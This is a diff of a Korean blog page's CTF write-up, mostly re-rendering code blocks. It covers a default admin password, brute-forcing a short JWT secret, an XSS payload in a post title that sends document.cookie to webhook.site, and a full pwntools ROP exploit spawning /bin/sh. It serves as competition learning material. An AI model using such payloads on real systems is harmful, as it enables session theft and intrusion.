@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -392,7 +392,15 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>admin 계정에 대해서</p>
 <p>비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고,</p>
 <p>이를 통해 로그인 하여 플래그를 얻어낼 수 있었다.</p>
-<h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jwt: &#123;</span><br><span class="line">    bruth: &#123;</span><br><span class="line">      key: <span class="string">&#x27;********&#x27;</span>, <span class="comment">// 0~9, 8 length</span></span><br><span class="line">      options: &#123;</span><br><span class="line">        issuer: <span class="string">&#x27;c2w2m2&#x27;</span>,</span><br><span class="line">        expiresIn: <span class="string">&#x27;1d&#x27;</span>,</span><br><span class="line">        algorithm: <span class="string">&#x27;HS256&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><pre><code class="js">jwt: &#123;
+    bruth: &#123;
+      key: &#39;********&#39;, // 0~9, 8 length
+      options: &#123;
+        issuer: &#39;c2w2m2&#39;,
+        expiresIn: &#39;1d&#39;,
+        algorithm: &#39;HS256&#39;,
+      &#125;
+ &#125;;</code></pre>
 <p>해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다.</p>
 <p>config.js 에서 위와 같은 내용을 확인할 수 있었고</p>
 <p>결론적으로 secret key를 브포해서 찾아내야 하는 것이였다.</p>
@@ -403,16 +411,77 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </ul>
 <h3 id="3-Web-CSRF"><a href="#3-Web-CSRF" class="headerlink" title="3. [Web] CSRF"></a>3. [Web] CSRF</h3><p>해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다.</p>
 <p>문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다.</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (board.content.match(<span class="regexp">/script|img|on/i</span>)) <span class="keyword">return</span> res.send(&#123; <span class="attr">code</span>: <span class="number">400</span> &#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="js">if (board.content.match(/script|img|on/i)) return res.send(&#123; code: 400 &#125;);</code></pre>
 <p>무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다.</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site~&#x27;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+<pre><code class="js">location.href=&#39;https://webhook.site~&#39; + document.cookie;</code></pre>
 <h3 id="4-Pwn-Solo-test"><a href="#4-Pwn-Solo-test" class="headerlink" title="4. [Pwn] Solo test"></a>4. [Pwn] Solo test</h3><p>ROP 기법을 이용해서 풀면 된다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc227.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x0000000000400b83</span></span><br><span class="line">ret = <span class="number">0x00000000004005f1</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">solo = e.symbols[<span class="string">&#x27;solo&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Me&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;CTF&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Never&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(solo)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<pre><code class="py">#!/usr/bin/python
+
+from pwn import *
+
+p = process(&#39;./solo_test&#39;)
+
+e = ELF(&#39;./solo_test&#39;)
+
+libc = ELF(&#39;./libc227.so&#39;)
+
+pr = 0x0000000000400b83
+ret = 0x00000000004005f1
+
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;]
+solo = e.symbols[&#39;solo&#39;]
+
+puts_offset = libc.symbols[&#39;puts&#39;]
+system_offset = libc.symbols[&#39;system&#39;]
+binsh_offset = next(libc.search(&quot;/bin/sh&quot;))
+
+p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Me&#39;)
+p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;)
+p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;CTF&#39;)
+p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Never&#39;)
+p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;)
+
+
+payload = &quot;A&quot;*88
+payload += p64(pr)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(solo)
+
+p.sendlineafter(&#39;--&gt; &#39;,payload)
+
+puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
+
+libc_base = puts_addr - puts_offset
+system_addr = libc_base + system_offset
+binsh_addr = libc_base + binsh_offset
+
+payload = &quot;A&quot;*88
+payload += p64(pr)
+payload += p64(binsh_addr)
+payload += p64(ret)
+payload += p64(system_addr)
+
+p.sendlineafter(&#39;--&gt; &#39;, payload)
+
+p.interactive()
+
+p.close()</code></pre>
+
   
   
     
     <div class='footer'>
       
+      
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2020/09/11/picoctf-200911/" title="PicoCTF 2019 Write Up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">PicoCTF 2019 Write Up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">BISC CTF 2020(oldschool) write up</span></a></div></section></div>
       
       
       
@@ -426,10 +495,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-17T19:01:42+09:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-26T00:00:00+09:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditJan 17, 2021</p>
+    <p>EditDec 26, 2020</p>
   </a>
 </div>
 
@@ -549,42 +618,6 @@ https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc1748...</
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -720,6 +753,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1095,6 +1130,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
